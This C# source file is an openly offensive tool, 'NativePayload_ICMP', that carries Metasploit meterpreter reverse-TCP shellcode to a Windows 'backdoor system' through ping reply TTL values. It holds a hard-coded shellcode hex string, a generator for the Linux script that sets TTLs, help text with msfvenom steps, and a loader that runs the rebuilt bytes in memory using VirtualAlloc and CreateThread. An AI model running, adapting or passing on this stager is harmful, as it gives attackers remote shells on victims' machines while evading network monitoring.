using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Diagnostics;
using System.Data;
using System.Runtime.InteropServices;

namespace NativePayload_ICMP
{
    class Program
    {
        static string payload = "fc4883e4f0e8cc0000004151415052"
           + "51564831d265488b5260488b521848"
           + "8b5220488b7250480fb74a4a4d31c9"
           + "4831c0ac3c617c022c2041c1c90d41"
           + "01c1e2ed524151488b52208b423c48"
           + "01d0668178180b020f85720000008b"
           + "80880000004885c074674801d0508b"
           + "4818448b40204901d0e35648ffc941"
           + "8b34884801d64d31c94831c0ac41c1"
           + "c90d4101c138e075f14c034c240845"
           + "39d175d858448b40244901d066418b"
           + "0c48448b401c4901d0418b04884801"
           + "d0415841585e595a41584159415a48"
           + "83ec204152ffe05841595a488b12e9"
           + "4bffffff5d49be7773325f33320000"
           + "41564989e64881eca00100004989e5"
           + "49bc0200115cc0a8013241544989e4"
           + "4c89f141ba4c772607ffd54c89ea68"
           + "010100005941ba29806b00ffd56a05"
           + "415e50504d31c94d31c048ffc04889"
           + "c248ffc04889c141baea0fdfe0ffd5"
           + "4889c76a1041584c89e24889f941ba"
           + "99a57461ffd585c0740a49ffce75e5"
           + "e8930000004883ec104889e24d31c9"
           + "6a0441584889f941ba02d9c85fffd5"
           + "83f8007e554883c4205e89f66a4041"
           + "59680010000041584889f24831c941"
           + "ba58a453e5ffd54889c34989c74d31"
           + "c94989f04889da4889f941ba02d9c8"
           + "5fffd583f8007d2858415759680040"
           + "000041586a005a41ba0b2f0f30ffd5"
           + "575941ba756e4d61ffd549ffcee93c"
           + "ffffff4801c34829c64885f675b441"
           + "ffe7586a005949c7c2f0b5a256ffd5";

        public static DataTable Hex_Dec_Table;


       static string help = "\n"+"NativePayload_ICMP Published by Damon Mohammadbagher"+"\n\n"+"NativePayload_ICMP null ==> PAYLOAD generate auto" + "\n"
         + "NativePayload_ICMP null \"ffccab1cd01f0400 ....\" Input your meterpreter payload to making sh file" + "\n\n"
         + "example step1 msfvenom --arch x86_64 --platform windows -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.50 -f c > payload.txt" + "\n"
         + "note: copy your msfvenom output payloads to 'Payload string' like 'fc4883e4f0e8cc00000415141505265'" + "\n"
         + "example step2 c:\\> NativePayload_ICMP.exe null \"Payload string\" > script.sh" + "\n"
         + "example step2 c:\\> NativePayload_ICMP.exe null \"fc4883e4f0e8cc00000415141505265\" > script.sh" + "\n"
         + "example step3 c:\\> NativePayload_ICMP.exe ipaddress (sending ICMPv4 traffic to this ipaddress by ping" + "\n"
         + "example step3 c:\\> NativePayload_ICMP.exe 192.168.1.50" + "\n"
         + "example step4 linux side ./script.sh " + "\n"
         + "note: after chmod also adding #!/bin/bash to script.sh file , you can run this script in PING Responder system." + "\n\n"
         + "note: you should run this script in your linux after step3 for Response to PING traffic from backdoor system" + "\n"
         + "note: Backdoor system is win with NativePayload_ICMP.exe and ipaddress for example: 192.168.1.120" + "\n"
         + "note: PING Responder system is linux with ./script.sh and ipaddress for example : 192.168.1.50" + "\n"
         + "note: PING Responder system is also Meterpreter Listener by ipaddress : 192.168.1.50" + "\n\n"
         + "<summary>" + "\n"
          + "in this case after 1020 ping request and response you have Meterpreter Session by ICMPv4" + "\n"
          + "Dumping Payloads by TTL in PING Response..." + "\n"
          + "Meterpreter Payload is 510 bytes" + "\n"
          + "  510 * 2 = 1020" + "\n"
          + "  0 ... 1019 = 1020 Request" + "\n"
          + "</summary>" + "\n";
        
  
        static void Main(string[] args)
        {
            try
            {


                Hex_Dec_Table = new DataTable();

                Hex_Dec_Table.Columns.Add("Dec", typeof(int));
                Hex_Dec_Table.Columns.Add("Hex", typeof(string));

                for (int i = 0; i <= 15; i++)
                {
                    if (i <= 9)
                    {
                        Hex_Dec_Table.Rows.Add(i, i.ToString());
                    }
                    else if (i >= 10)
                    {
                        switch (i)
                        {
                            case 10:
                                {
                                    Hex_Dec_Table.Rows.Add(i, "a");
                                }
                                break;
                            case 11:
                                {
                                    Hex_Dec_Table.Rows.Add(i, "b");
                                }
                                break;
                            case 12:
                                {
                                    Hex_Dec_Table.Rows.Add(i, "c");
                                }
                                break;
                            case 13:
                                {
                                    Hex_Dec_Table.Rows.Add(i, "d");
                                }
                                break;
                            case 14:
                                {
                                    Hex_Dec_Table.Rows.Add(i, "e");
                                }
                                break;
                            case 15:
                                {
                                    Hex_Dec_Table.Rows.Add(i, "f");
                                }
                                break;
                            // default:
                        }

                    }

                }
                if (args[0].ToUpper() == "HELP") 
                {
                    Console.WriteLine(help);
                }
                else if (args[0].ToUpper() == "NULL")
                {
                    
                    //// NativePayload_ICMP null ==> PAYLOAD generate auto
                    //// NativePayload_ICMP null "ffccab1cd01f0400 ...." Input your meterpreter payload to making sh file
                    //// example step1 msfvenom --arch x86_64 --platform windows -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.50 -f c > payload.txt
                    //// copy your msfvenom output payloads to "Payload string" like "fc4883e4f0e8cc00000415141505265"
                    //// example step2 c:\> NativePayload_ICMP.exe null "Payload string" > script.sh
                    //// example step2 c:\> NativePayload_ICMP.exe null "fc4883e4f0e8cc00000415141505265" > script.sh
                    //// example step3 c:\> NativePayload_ICMP.exe 192.168.1.50
                    //// example step4 linux side ./script.sh 
                    //// note: after adding #!/bin/bash to script.sh file run that ;)
                    if (args.Length == 2) { payload = args[1]; }
                    string ff = "";
                    Console.Write("\n sudo sysctl net.ipv4.ip_default_ttl=" + "254" + " ; " + "sleep 1 ; \n");

                    //// sysctl used to changing TTL for ping respnse by ping and ICMPv4 response 
                    //// so i do this by TTL = 100 up tp 115
                    //// if you want do this by TTL 200 you should change your code here 
                    //// something like this 
                    //// Console.Write("\n sudo sysctl net.ipv4.ip_default_ttl=" + 2 + ss.Remove(0,1) + " ; " + "sleep 2 ; \n");
                    //// or you can change this Dic --> HexDic values
                    //// something like this 
                    //// {'0',200},{'1',201},{'2',202},{'3',203},{'4',204},{'5',205},{'6',206},{'7',207},{'8',208}
                    //// ,{'9',209},{'a',210},{'b',211},{'c',212},{'d',213},{'e',214},{'f',215}
                    //// TTL 254 is flag for starting
                    //// TTL 255 is flag for adding new TTL for new Payload

                    for (int i = 0; i < payload.Length; )
                    {

                        if (i != payload.Length)
                        {
                            ff = payload.Substring(i, 1);
                            string ss = _HextoDecimal(ff);
                            // debug only
                            //Console.WriteLine(ff + "  " + ss);
                            Console.Write("\n sudo sysctl net.ipv4.ip_default_ttl=" + ss + " ; " + "sleep 2 ; \n");
                            Console.Write("\n sudo sysctl net.ipv4.ip_default_ttl=" + "255" + " ; " + "sleep 1 ; \n");
                            Console.WriteLine();

                            i++;

                        }

                    }


                    //// debug only print codes by dec ;)
                    //string fff;
                    //for (int bb = 0; bb < payload.Length; )
                    //{
                    //    fff = payload.Substring(bb, 1);
                    //    string ss = _HextoDecimal(fff);
                    //    Console.Write(ss.Substring(1, 2));
                    //    bb++;
                    //}

                }
                else 
                {
                    bool flag_end = false;
                    bool init = false;
                    int flag_end_count = 0;
                    int Payload_counter = 0;
                    string temp = "";
                    string start_time, end_time = "";
                    start_time = DateTime.Now.ToString();
                    string Oonaggi = "";
                    Console.ForegroundColor = ConsoleColor.Gray;
                    Console.WriteLine();
                    Console.WriteLine("NativePaylaod_ICMPv4 Published by Damon Mohammadbagher");
                    Console.WriteLine("Strat Sending ICMPv4 (ping) to Dump Payloads by TTL response ;)");
                    Console.WriteLine();
                    while (true)
                    {


                        if (flag_end) break;
                        
                        //// ping and sending ICMP Traffic to attacker linux system to Dump payloads by TTL response ;)
                        string getcode = _Ping(args[0], 1);
                        try
                        {

                            getcode = getcode.Remove(getcode.Length - 1, 1);
                        }
                        catch (Exception e1)
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("e1 : " + e1.Message);
                            Console.WriteLine();
                            Console.WriteLine("Error : it is not good  ;( ");
                            Console.WriteLine("Please run this tool again");
                            Console.WriteLine("after running this tool Please again run your ./script.sh in linux ;)");
                            Console.ForegroundColor = ConsoleColor.Gray;
                            break;
                        
                        }

                        if (getcode == "254") { init = true; }

                        if (getcode != "255")
                        {
                            flag_end_count = 0;
                            if (getcode != temp && getcode != "255")
                            {
                                if (init && getcode != "254")
                                {
                                    Console.ForegroundColor = ConsoleColor.Green;
                                    Console.Write("{0} , Dump:{1},", DateTime.Now.ToString(), Payload_counter.ToString());
                                    Console.ForegroundColor = ConsoleColor.Cyan;
                                    //string dd = _HextoDecimal(getcode.Substring(1, 2));
                                    Console.Write(" DATA[{0}] ", getcode.Substring(getcode.Length - 2, 2));
                                    Oonaggi += getcode.Substring(getcode.Length - 2, 2);
                                    Console.ForegroundColor = ConsoleColor.Green;
                                    Console.WriteLine("from {0} final: {1}", args[0], getcode);
                                    Payload_counter++;
                                }
                                else if (init == false)
                                {
                                    Console.ForegroundColor = ConsoleColor.DarkGreen;
                                    Console.WriteLine("{0} , {1} Find DATA from {2} final: {3}", DateTime.Now.ToString(), Payload_counter.ToString(), args[0], getcode);
                                }
                            }
                            else if (getcode == temp && getcode != "255")
                            {
                                Console.ForegroundColor = ConsoleColor.DarkGreen;
                                Console.WriteLine("{0} , {1} Find DATA from {2} final: {3}", DateTime.Now.ToString(), Payload_counter.ToString(), args[0], getcode);
                            }
                            
                            System.Threading.Thread.Sleep(1000);
                            temp = getcode;
                        }
                        else if (getcode == "255")
                        {
                            flag_end_count++;
                            Console.ForegroundColor = ConsoleColor.DarkGreen;
                            Console.WriteLine("{0} , {1} Find DATA from {2} final: {3}", DateTime.Now.ToString(), Payload_counter.ToString(), args[0], getcode);
                            
                            System.Threading.Thread.Sleep(500);
                            temp = getcode;
                            if (flag_end_count >= 10) { flag_end = true; }
                        }
                    }
                    
                    end_time = DateTime.Now.ToString();

                    Console.WriteLine(end_time + " , Done ");

                    byte[] __Bytes = new byte[Oonaggi.Length / 4];
                    int payload_dec_count = Oonaggi.Length / 4;
                    int tmp_counter = 0;
                    string current = null;
                    int _0_to_2_ = 0;
                    for (int d = 0; d < payload_dec_count; )
                    {
                        string tmp1_current = (Oonaggi.Substring(tmp_counter, 2));

                        for (int j = 0; j <= 15; j++)
                        {
                            if (Convert.ToInt32(Hex_Dec_Table.Rows[j].ItemArray[0]) == Convert.ToInt32(tmp1_current))
                            {                                
                                _0_to_2_++;

                                current += (Hex_Dec_Table.Rows[j].ItemArray[1].ToString());

                                if (_0_to_2_ == 2)
                                {
                                    Console.Write(current + " ");
                                    __Bytes[d] = Convert.ToByte(current, 16);
                                    _0_to_2_ = 0;
                                    d++;
                                    current = null;
                                }
                                
                            }

                        }

                        tmp_counter++;
                        tmp_counter++;

                    }
                    Console.WriteLine();
                    Console.ForegroundColor = ConsoleColor.Gray;
                    Console.WriteLine("Bingo Meterpreter session by ICMPv4 traffic ;)");
                    UInt32 funcAddr = VirtualAlloc(0, (UInt32)__Bytes.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                    Marshal.Copy(__Bytes, 0, (IntPtr)(funcAddr), __Bytes.Length);
                    IntPtr hThread = IntPtr.Zero;
                    UInt32 threadId = 0;
                    IntPtr pinfo = IntPtr.Zero;

                    hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
                    WaitForSingleObject(hThread, 0xFFFFFFFF);

                }
            }
            catch (Exception _main)
            {
                Console.WriteLine("Main Error: {0}", _main.Message);
                Console.WriteLine("Main Error: Please use help , NativePayload_ICMP help", _main.Message);


            }
        }


        static Dictionary<char, int> HexDic = new Dictionary<char, int> 
        {
             //// {'0',200},{'1',201},{'2',202},{'3',203},{'4',204},{'5',205},{'6',206},{'7',207},{'8',208}
             //// ,{'9',209},{'a',210},{'b',211},{'c',212},{'d',213},{'e',214},{'f',215}

             {'0',100},{'1',101},{'2',102},{'3',103},{'4',104},{'5',105},{'6',106},{'7',107},{'8',108}
            ,{'9',109},{'a',110},{'b',111},{'c',112},{'d',113},{'e',114},{'f',115}
        };

        static string _HextoDecimal(string hexstring)
        {
            
            string result = "";
            hexstring = hexstring.ToLower();
            for (int i = 0; i < hexstring.Length; i++)
            {
                char Oonagii = hexstring[hexstring.Length - 1 - i];
                result += (HexDic[Oonagii] * (int)Math.Pow(16, i)).ToString() + " ";
            }
            return result;
        }
       

        static string _Ping(string IPAddress_DNSName, int counter)
        {
            string Final_Dec = "";

            try
            {
                //// 1 is good idea ;)
                //// 1 is best performance by 1 request and one ping response (default)
                //// 2 is slow performance by 2 request and two ping response 
                //// if you want use 2 then you should change Sleep in Linux sh file too
                //// so in code i changed this to 1 ;) , Sorry 
                if (counter != 1) { counter = 1; }

                /// Make ICMPv4 traffic for getting Meterpreter Payloads by Ping
                ProcessStartInfo ns_Prcs_info = new ProcessStartInfo("ping.exe", IPAddress_DNSName + " -n " + counter.ToString());                
                ns_Prcs_info.RedirectStandardInput = true;
                ns_Prcs_info.RedirectStandardOutput = true;
                ns_Prcs_info.UseShellExecute = false;
                

                Process myPing = new Process();
                myPing.StartInfo = ns_Prcs_info;
                myPing.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                myPing.Start();

                //string result_Line0 = "";
                string Pingoutput = myPing.StandardOutput.ReadToEnd();
                string[] All_lines = Pingoutput.Split('\t', '\n');
                
                //int PayloadLines_current_id = 0;
                foreach (var item in All_lines)
                {
                    if (item.StartsWith("Reply "))
                    {
                        Final_Dec = item.Substring(item.Length - 4);                        
                    }
                 // debug
                 // Console.WriteLine(item + "\n"+ s);  
                }
                
                
            }
            catch (Exception e)
            {

                Console.WriteLine(e.Message);
            }
            return Final_Dec;
        }

        public static UInt32 MEM_COMMIT = 0x1000;
        public static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);     
    }
}
